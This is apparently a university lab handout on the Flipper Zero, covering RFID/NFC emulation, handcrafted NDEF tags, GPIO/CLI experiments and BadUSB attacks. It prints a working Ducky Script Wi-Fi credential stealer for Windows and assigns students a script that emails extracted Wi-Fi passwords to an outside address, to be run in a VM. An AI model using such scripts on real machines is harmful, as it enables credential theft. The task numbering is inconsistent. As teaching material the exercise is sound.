Software & Hardware Security Lab 6: Flipper Zero
====

## ToC

* [Preliminary tasks](#Preliminary-tasks)
* [Introduction](#Introduction)
    * [Practical arrangements of this lab](#Practical-arrangements-of-this-lab)
    * [Grading](#Grading)
    * [Deep Dive into Flipper Zero](#Deep-Dive-into-Flipper-Zero)


* [Tasks](#Tasks)
  * [Task 1](#Task-1)
  * [Task 2](#Task-2)
  * [Task 3](#Task-3)
  * [Task 4](#Task-4)

# Preliminary tasks

Get familiar with following background information about Flipper Zero and RFID Access Control.

* Flipper Zero on [Wikipedia](https://en.wikipedia.org/wiki/Flipper_Zero)


Couple of articles explaining RFID Access Control systems
* Article 1: [RFID Access Control Breakdown](https://www.swiftlane.com/blog/rfid-access-control/)
* Article 2: [How RFID Access Control Works](https://www.rfidfuture.com/rfid-access-control.html)

# Introduction

This week’s theme is hardware security and how it can be exploited by hackers.
In this lab you will be using Flipper Zero device to perform hardware security experiments.
Introductory tasks revolve around theory of exploiting hardware
and advanced tasks include usage of actual device (Flipper Zero) to perform them.

[Flipper Zero](https://flipperzero.one/) is a portable multi-tool for pentesters and geeks in a toy-like body.
It loves hacking digital stuff, such as radio protocols, access control systems, hardware and more.
It's fully open-source and customizable and you can extend it in whatever way you like.


## Practical arrangements of this lab

This lab is little bit different than others because tasks require the usage of external device.
Number of devices are limited which causes some difficulties to arrangements.

* Students are encouraged to do the laboratory work in groups of 2, 3 or 4 if possible.
* Students are encouraged to borrow device do the lab ahead of schedule to balance load on actual lab week.
* We try to arrange loaning times so that everyone would have chance to hold device at least couple of days if they want.
* Answers to theoretical questions must be returned individually.

## Grading

The lab consists of four tasks. Their points are summarized below. “Good-to-have skills” are indicative only.

Task | Points | Description | Good-to-have skills
--|:--:|--|--
1 | 1 | Familiarization with the Flipper Zero: initial setup, reading/saving basic tags, and reviewing technical articles on the device and RFID access systems | Article reading, RF fundamentals
2 | 1 | NFC card emulation and basic access control experiments (including MIFARE Classic) using the Flipper Zero | Basic Flipper Zero operation, NFC standards
3 | 1 | Morse code (and disco lights) with infrared | Basic Flipper Zero operation
4 | 1 | Engineering a BadUSB attack with the Flipper Zero | Ducky Script, Linux, PowerShell
5 | 1 | Advanced experimentation (e.g., GPIO, Arduino integration, CLI, other modules) based on interest | Arduino, Hardware integration, CLI

---

## Deep-Dive into Flipper Zero

## Some control functions

Device can be powered on by holding and pressing illustrated button

![Power On](./pictures/power_on.png)


Device can be rebooted as shown

![Reboot](./pictures/reboot.png)


Charging icons

![Charging](./pictures/charging.png)


## Setting up a brand new Flipper Zero

Flipper Zero might come with an outdated firmware.
In-order to use it, a firmware upgrade should be performed.
Flipper Zero stores all information on an SD card including databases and is also required for firmware upgrade.
Make sure to insert an SD card before updating the firmware.

[Qflipper](https://flipperzero.one/update) is a desktop application for updating firmware


![Qflipper photo](./pictures/qflipper.png)


**SD Card Installation:** Format SD card to exFAT or FAT32. Flipper Zero has a built-in format system which can be used to do this.
SD Card stores the auxiliary files that Flipper calls databases.
Many features of flipper zero require these auxiliary files to work properly. Therefore, it is important to have an SD card mounted.

![SD Icon](./pictures/sd_mount.png)
![Incorrect SD](./pictures/sd_fail.png)

All signal keys, remotes and card information captured are stored on the SD card as well.

## RFID Protocol Stack and Flipper Zero

Radio-wave technology is common nowadays in many places such as cards, gym keys, access machines e.t.c. The RF products are divided into two main broad categories:

    High frequency tags 13.56MHz (low range, some of them referred to as NFC ~Near Field Communication)

    Low frequency tags 125kHz (high range)

High frequency tags are more secure and used in credit cards etc. Whereas, low frequency tags are less secure and used in generic access keys or cards for example.
Moreover, high frequency tags support encryption, authentication and cryptography. Flipper Zero is constructed with dual-band RFID antenna and can interact with both of these.

---




# Tasks

Start your work from Task 1 and proceed to harder ones. Every task is designed to require more skills and amount of work than previous one.

Task 1 and 2 together are designed to take about 3-4 hours to complete. Try to finish those at lab session. You can borrow equipment if you want to continue working with those tasks at home.

Tasks 3 and 4 are more laborious and it is likely that those can not be done in time limit of single lab session. You must discuss about borrowing equipment with lab assistants if you want to do those tasks.


> Some tasks require you to make videos and write reports. Videos naming format: <task#_video> for example <task2C_video>

> Compress videos into an archive and upload to Moodle return box alongside your answer return template.

**If you are doing this work in group, remember answers to theoretical questions must be individual. You are encouraged to research and discuss together but write answers in your OWN WORDS**

## Task 1

Task 1 tasks are meant to be relatively simple tasks to help you understand what is the Flipper Zero device and what can be done with it.
You will return answers to theoretical questions.

Flipper zero can read and save information of many RFID tags and cards operating on low and high frequencey. Furthermore, these cards can be emulated by flipper zero. This bypasses the need to use those cards at all.

In this task you will learn basic usage of flipper device to read NFC cards, RFID tags and store them. Later, you will download saved files information and inspect them.

Read the section [Deep Dive into Flipper Zero](#Deep-Dive-into-Flipper-Zero) before starting this task.

## A) Getting started with the device

The easiest way to get started with Flipper Zero is to:
1. Format the SD memory card by going to Main Menu -> Settings -> Storage -> Format SD card
2. Download the latest firmware using Qflipper as instructed above

## B) Testing Flipper Zero on RFID and infrared hardware

> We assume that you or one of your group members have at least some relevant devices or cards.
> If you don't have any, you can ask course staff.

In this task, you need to use FlipperZero to read and save data from three different hardware devices using the following technologies/signals:

* High-frequency RFID / NFC (Car keys, contactless credit cards, public transit cards, etc. — these are often cryptographically protected)
* Low frequency RFID (Access keyfobs, old cards and passes, pet microchips)
* Infrared (Different types of remotes: TV, audio system, toys, lamps)

After reading and saving the different signals, try to emulate them using the Flipper Zero.

**For each technology mentioned above answer the following questions**

**What device/hardware did you read?**

**What protocol/standard does it use?**

**Is the data Encrypted? If so, what type of encryption does it use (or your best guess)?**

**What information can be extracted from the signal and how it could be miss used? You can open the saved data on computer in text editor**

**Were you able to emulate the read signal? If yes, describe how well it worked; if not, explain why it might have not worked.**

**You can also include a video as proof**

>[!IMPORTANT]
>_Blur or remove any personal information._
> _Remember to delete all saved files from flipper before you return them._
---

## C) Understanding RFID and how Flipper interacts with it

This task has three sub-questions and you are expected to carry out research by surfing the internet or watching videos about Flipper. Answer the following three questions:

**What different kinds of RFID tags are present in the market? Is there a way to distinguish between them? How can you know if the RFID tag is secure by current best practices?**

It is necessary to know the RFID tag types so that you know how to interact with them and then work on exploiting them with Flipper Zero.

**How does Flipper Zero interact with different RFID tags? How do tag readers work in general?**

You should explain how the technology within Flipper Zero interacts with different types of RFID tags/cards. Furthermore, explain how tag readers work. What happens when a tag comes near a reader?

__Things to Consider__:
Your answers should include descriptions of the power sources of these tags and readers, mechanisms to activate them, how they emit radiation, and which frequency bands they utilize.

**What tools exist in the market and what mobile applications are available to access/read RFID devices?**

Links to devices and/or screenshots of mobile applications are enough. Write a small description of these tools/applications.
You can also try to search what rooted Android can be capable of.

---

## Task 2: NDEF message creation and NFC reading with phone


Most modern smartphones (Android ~2010+ and iPhone ~2014+) include NFC hardware that can read and write NDEF (NFC Data Exchange Format) messages, support contactless payments, and perform host card emulation (HCE).
We assume that your group has a phone which is capable of reading NFC tags.

Phones process unencrypted NDEF records directly to trigger supported actions; encrypted NDEF content requires a specific app. The user is typically prompted before the action executes.


1. Connect to Wi‑Fi using SSID, password, and encryption type
2. Open a URL / website
3. Share or save contact information (vCard)
4. Initiate a call or send an SMS
5. Send an email
6. Launch installed apps via URL schemes / open images
7. Trigger or change basic phone settings
8. Display text

Your task is to create an NFC tag (NDEF message) with Flipper Zero that a phone can read to execute two or more of the above actions. 
The goal is to generate and write the NDEF message, as a `.nfc` file and move this file into Flipper Zero, and successfully emulate the data contents, finally reading the action with your phone.
You should try and document at least two different functionalities as described above.

> [!NOTE]
> Do not use existing Flipper Zero applications to generate the NDEF bytes. Instead, manually construct the raw byte sequence. This low‑level approach helps you understand format at least on some level.
>
> You may use existing libraries only to validate your handcrafted NDEF message before loading it onto the Flipper Zero.


You can use Python to write files, and, for example, the [ndeflib](https://github.com/nfcpy/ndeflib) Python library generate and validate the  tags.
See the [relevant docs part, which also describes known record types.](https://ndeflib.readthedocs.io/en/stable/records.html)


Verify iOS compatibility for the selected functionality [here](https://gist.github.com/equipter/de2d9e421be9af1615e9b9cad4834ddc) and [here](https://developer.apple.com/documentation/corenfc/adding-support-for-background-tag-reading) , if you happen to have iPhone.
For Android, some documentation is available [here](https://developer.android.com/develop/connectivity/nfc/nfc).

### Creating the .nfc file

The `.nfc` file format is described in the Flippers [docs.](https://developer.flipper.net/flipperzero/doxygen/nfc_file_format.html)
For example, we can use NTAG215 chip emulation.
Then emulation should be based on NTAG/Ultralight format.

In order to do that, open NFC app from the Flipper and create new tag template manually, by choosing the NTAG215 option.
Connect Flipper to computer, and use `qFlipper` to download the `.nfc` file on your local computer.
We need to modify the .nfc file to inject the NDEF payload into the data pages. The pages begin as shown below; we will place the payload starting at Page 4 and onward, using the TLV (Type-Length-Value) structure.

```
Page 0: 04 CF 5A 19 - 3 first UUID bytes + BCC0 (BCC0 = 0x88 ⊕ UID0 ⊕ UID1 ⊕ UID2)
Page 1: 53 82 9D 80 - remaining 4 bytes of UUID 
Page 2: CC 48 00 00 - BCC1 = UID3 ⊕ UID4 ⊕ UID5 ⊕ UID6 + internal byte + lock bytes
Page 3: E1 10 3E 00 - E1 (NFC Compliant), 10 (NFC 1.0 support), 3E (496 bytes in data memory area), 00 (not write protected)
Page 4: 03 00 FE 00 - empty NDEF message
```
In order to make compatible NDEF payload, it must meet the following when filling pages, starting from page 4:

1. The first byte 0x03 stands for NDEF type.
2. Second byte must be length of the NDEF payload
3. As many bytes as required to put the NDEF payload. (note that payload with more than 256 bytes uses different protocol)

After the modifications, upload `.nfc` file back to Flipper. In NFC app, you can read the info part from the tag, and see if it correctly has NDEF data. 

If you are interested, NDEF protocol is very backwards compatible, and you can use the original 1.0 standard version from 2006, which is publicly available [here](https://freemindtronic.com/wp-content/uploads/2022/02/NFC-Data-Exchange-Format-NDEF.pdf), for example, to see what happens on NDEF in byte level.

### Return:
1. A short report describing how you performed the exercise (including code)
2. Which actions you implemented and why
3. The exact NDEF message(s) (as final `.nfc` files)
4. (Optional) A demo video showing the phone reacting to the tag

>[!IMPORTANT]
> Blur or remove any personal information in screenshots or videos.  
> Delete all saved files on the Flipper Zero that may contain personal information before returning the device.
> At least on iPhone, reading the NFC tag must happen exactly on the correct place.

We didn't do any "real" hacking on this task, but security has relied too much for obscurity in the past. You may now get started with NFC to do something more.

---

## Task 3: Infrared Module

TBA

---
## Task 3
### Design a Bad USB attack to steal password by plugging in flipper zero, and sending them over email

In this task, you will learn how to use the badUSB module in flipper and convert it into a powerful badUSB for pentesting attacks.

BadUSB attacks involve exploiting the inherent trust that USB devices have with computers. These attacks typically involve reprogramming a USB device (such as a flash drive or even a seemingly harmless device like a keyboard) to act as a malicious device, which can then execute various harmful actions.

For example, a BadUSB attack might involve creating a USB device that, when plugged into a computer, presents itself as a keyboard and starts typing out a series of commands to the operating system. These commands could include downloading and executing malicious scripts that attempt to extract sensitive information like WiFi credentials from the system.

Since WiFi credentials are often stored on a computer to allow automatic connections to networks, a BadUSB attack could potentially target the relevant configuration files or use other methods to access and steal these credentials. These credentials can then be exported via email using powershell script.




### Getting familiar with Ducky Script

## A) Writing a script to open shell on linux

In this task you will get familiar with writing scripts that can open shell.

Ducky Script Tutorial: [link](https://web.archive.org/web/20220816200129/http://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript)

if you're interested to look for BadUsb scripts for flipper, you can find many examples on internet (github). For example [this](https://web.archive.org/web/20231218132739/https://github.com/UNC0V3R3D/Flipper_Zero-BadUsb) and [this](https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB)


Take a look at code below which opens a powershell on windows platform.

```shell
DELAY 100
GUI r
DELAY 100
STRING powershell
DELAY 100
```

**Write a script to open a shell on linux. Paste your script below**


__NOTE__: You can test your script only on Rubber Ducky USB compatible devices. These hardware tools are specifically designed to emulate a keyboard and execute scripts on a target computer.

__HINT__: If you need to test your solution, copy paste it to flipper zero's badusb folder. Connect it with pc and run the script from your device!


## B) Engineering a complete script to steal password from a text file and send it over email

Before proceeding with this task, you'll need to install Powershell on your virtual machine. Install instructions are given below for arch linux [reference guide](https://ephos.github.io/posts/2018-9-17-Pwsh-ArchLinux)

```shell
# POWERSHELL INSTALL SCRIPT FOR ARCH LINUX
# Clone the AUR package down with git, use the "Git Clone URL"
git clone https://aur.archlinux.org/powershell-bin.git

# Navigate into the directory from the Git clone
cd powershell-bin

# AUR Packages are community created, MAKE SURE YOU REVIEW THE FILES BEFORE INSTALL!
cat PKGBUILD

# Run makepkg to build the AUR package, '-s' will sync dependencies, '-i' will install the package after build.
makepkg -si
```


You are given a sample network file called [networkfile.nmconnection](misc/networkfile.nmconnection) which contains Wifi credentials for a network called 'Cross'.
Now that you're familiar with ducky scripts, your end goal is a script which automatically extracts whole password and SSID for you from this file. Afterwards, it should send this password and SSID
over email to win10_9121@outlook.com!

To aid you in this task, flipper zero comes with a sample Wi-Fi credentials stealing script written in ducky language in following directory: _SD Card/badusb/Wifi-Stealer_ORG.txt_
The filename is: Wifi-Stealer_ORG.txt

However, this script is written for windows and does not have automated email sending component using powershell.

Contents of the file are shared below for your reference:

```shell
REM Title: Wifi Stealer
REM Author: 7h30th3r0n3
REM Target: Tested on Windows 7/8/10/11
REM Version: 1.0
REM Category: Grabber
REM Extracts the SSID and wifi shared key and puts them in a txt file named 0.txt on the desktop
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 500
STRING cd C:\Users\$env:UserName\Desktop; netsh wlan export profile key=clear; Select-String -Path WiFi-* -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} | % {$_ -replace '.xml:22:', ''} > 0.txt; del WiFi-*;exit
ENTER
```
**Your job is to first download given configuration file ([download link](misc/networkfile.nmconnection)) on your virtual linux. Use ducky script to come up with an attack that:**

i) finds the downloaded configuration file

ii) extracts Wifi password & SSID from it

iii) sends password & SSID to following email: win10_9121@outlook.com as plain body text


**Recommended way to proceed:**

**i.**	Download wifi credentials file on your machine.

**i.**	Write ducky script on your machine. Save file

**ii.**	Transfer to flipper device badusb folder using qFlipper app

**iii.** Connect flipper with a virtual linux VM

**iV.**	Run your script from flipper for testing

**v.** Repeat if no success with correct results


__HINT__: You should place your script in following directory of flipper: _SD Card/badusb/<your_script>_

This task will require some trial and error from your side before finally being able to steal credentials and send automatically over email. Partial marks can be awarded to good attempts.

>[!WARNING]
> Bad USB scripts can be very dangerous as they execute shell commands. Writing a wrong script can potentially damage the functionality of your OS or machine. Therefore, it is advised
to carry out badUSB attack on a virtual linux VM, to avoid harming your computer.

### What to return in this task?

You must return next 2 items to return template to gain points from this task:
1. Your working attack script.
2. Proof of success. A small video capturing the process. Compress and upload it to moodle or provide link from a streaming service.

>[!NOTE]
> Replace your SMTP email and password with dummy when submitting script. You could replace your authentication email with email@gmail.com, and password with abc1234 for example



---
## Task 4

Still want something more complex? You are freely encouraged to dive into your creativity to come up with a possible experiment. Sample options are given as a reference only. You can come up with your own and write a report about it.

There is no answer template for this tasks, but you are expected to make videos of successful experimentation as a proof and write a report:
 * Report must clearly show all the work you did. Otherwise it would be really hard to give you any kind of points.
 * Also remember that even if long and exhaustive report is usually considered as good, you do not have to be *too* exhaustive. We would like to see students use their time to do interesting experiments rather than using time to write overly long reports. You yourself decide what is important to tell and what is not.
 * Notice that even failed attempts might give you some points if report shows that your try was well thought out.

### What to return in this task?

You must return the following 2 items for this task and any other supplementary work (such as scripts, extracted info) you consider necessary:
1. A report explaining your plan of action, experiment and results. Write it in the return answer template file
2. Videos of experiments showing your work with Flipper Zero

Videos should be compressed and uploaded to Moodle directly with your return answer template submission.

> Your report should include:
* What is the experiment about? Plan of action
* Objective of this experiment? Intended outcome/result  
* Hardware and software setup required to achieve it
* Actual experiment details, challenges and roadblocks faced
* Video recordings of experiments

## Option 1. Flipper Zero and GPIO

Flipper Zero includes a GPIO module. GPIO stands for General Purpose Input/Output and refers to pins on a microcontroller or similar device that can be configured for input or output to communicate with other hardware components.

Detailed information on the pinout and functionality can be found in the official Flipper Zero documentation: https://docs.flipper.net/gpio-and-modules

You can interface a compatible hardware device of your choice, or you can borrow an Arduino UNO from the lab assistants to carry out this task. The image below shows equipment available for this task.

![Flipper&Arduino](./pictures/flipper_arduino.png)

A serial communication channel can be established between the Flipper and an Arduino by connecting the RX and TX pins and sharing a common ground. However, more information on this subject cannot be disclosed, and it is the students’ responsibility to study, research, and experiment to achieve a concrete objective.

A sample idea: Firmware extraction from an Arduino

- Connect the Flipper Zero to the target device using relevant interfaces (JTAG, UART, SPI, etc.).
- Use Flipper Zero’s hardware plugins or modules to interface with the target’s debug or communication ports.
- Attempt to extract firmware from the target device using the available interfaces. For example, you might use the UART module to capture data sent during the boot process.

Helpful document: https://arduino.stackexchange.com/questions/49476/is-it-possible-to-extract-a-hex-file-via-uart-from-an-arduino/49497#49497

If you plan to pursue this option, you will need to install the Arduino IDE on your Linux machine.

#### A note on installing the Arduino IDE on Arch Linux

Arduino IDE is not available in the Arch User Repository (AUR), which means you need to use an AUR helper like yay, brew, or manually build and install the package.

```shell
# Install yay

git clone https://aur.archlinux.org/yay.git
cd yay
makepkg –si

# Install arduino
yay -S arduino
```
## Option 2. Flipper Zero and CLI

Alternatively, you can explore the Flipper Zero’s command-line interface (CLI) from your computer. Flipper includes a hidden CLI that you can use to send commands and establish a communication channel at a frequency of your choosing.

"tio" (short for "tty input/output") is a command-line tool for serial communication that allows you to interact with serial devices such as microcontrollers and modems. You will need a tool like tio to establish a communication channel between the Flipper and your computer in order to access the CLI at a specified baud rate. Read more about the tool here: https://github.com/tio/tio

![Flipper_CLI](./pictures/flipper_cli.png)

A sample idea: Establish a Sub-GHz communication channel

- Connect the Flipper Zero to your machine. Use a tool like tio and run the appropriate command to open the Flipper CLI.
- To ensure proper serial communication between the Flipper and the CLI, set the correct baud rate.
- Once you have accessed the CLI, list the available commands. Establish a communication channel at your chosen frequency and broadcast some test messages.
- Record and document your progress. Include the commands you used.

NOTE: You might have to change some udev rules to allow communication. It is up to you how you proceed with this option.

## Option 3. Your choice

If you have another topic that uses Flipper Zero or is related to hardware security and you are interested in trying it, you can do so and document the process and results. For inspiration, you can look for ideas on what others are doing with Flipper Zero on GitHub and YouTube. To be accepted as Task 4, your idea must require a skill and workload level comparable to Options 1 and 2. REMEMBER: Before you pursue your custom idea, contact the assistants to ensure the topic is acceptable.

List of submodules present in the Flipper:

- NFC (high frequency)
- 125 kHz RFID
- Infrared
- Sub-GHz
- Sub-GHz Remote
- Sub-GHz Playlist
- IR Remote
- GPIO (Input/Output pins)
- iButton
- Bad USB
- U2F (Open Authentication Standard)

The Applications section of the device also contains useful folders. Students can explore this section, create an experiment with a clear objective, and write a report about it to complete this task.

You can also ask the course assistants for additional ideas. They may have interesting preliminary concepts that are not yet refined enough to include in this documentation. They are happy to share them, and it is up to you to refine the idea.
